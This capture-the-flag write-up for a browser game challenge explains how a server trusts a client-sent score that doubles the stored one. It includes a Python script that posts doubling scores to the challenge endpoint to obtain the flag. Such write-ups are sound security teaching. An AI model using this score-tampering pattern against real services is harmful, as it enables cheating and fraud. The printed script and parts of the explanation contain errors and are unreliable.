### Question

> I have recreated [one of the most classic games](https://floppybird.challs.m0lecon.it/) in the browser, can you score 1000 points and get the flag?
> Author: `mattiabrandon`
> Attechements: `Floppy Bird.zip`

### Solution

> First things first! look at the code! in specific - `app.py`

- After looking around I found the important part! **Line 42**
  
  ```py
  db_score = db.execute(
  'SELECT score FROM scores WHERE token = ?',
  (request.json['token'],)
  ).fetchone()
  ```
- Which has a flaw! it uses the client provided score and insert it into the database!!! REALLY! anyways..
- Another important code is **Line 51**
  
  ```py
  if client_score == db_score + 1 or client_score == db_score * 2:
  ```
- This line has 2 checks, the first is normal but the second is lovely! it's simply a booster code but hard coded! it checks the double `( * 2 )` of the stored score with the client score if they're equal which means it's the multiply of the score so like `1>4>8>16>32>64>128>256>512>1024` so we only need 11 steps/requests to reach the 1000 points to get the flag
- Okay! time to write a python code for this :)
  
  ```py
  import requests
  url = "https://floppybird.challs.m0lecon.it/update-score"
  TOKEN = requests.get("https://floppybird.challs.m0lecon.it/get-token").json()['token']
  data = {'score': 1, 'token': TOKEN} // token changes every request, so let's get one and use it for our scoring
  
  for _ in range ( 12 ):
   count += 1
   r = requests.post(url, json=data)
   print("sent request number: " + str(count))
   if r.text.__contains__("ptm{"):
   print(r.text)
   data['score'] = data['score'] * 2
  ```

- Simply, the code makes a 12 requests (only 11 needed but 1 extra - why not :D ) and multiplies the current score by 2 because the app.py code allows this as explained above

- Once the code reaches request No. 11 the score will be **1024** and the flag will be printed!
  
  > Flag: `ptm{n3v3r_7rus7_cl13n7_s1d3_d4ta}`
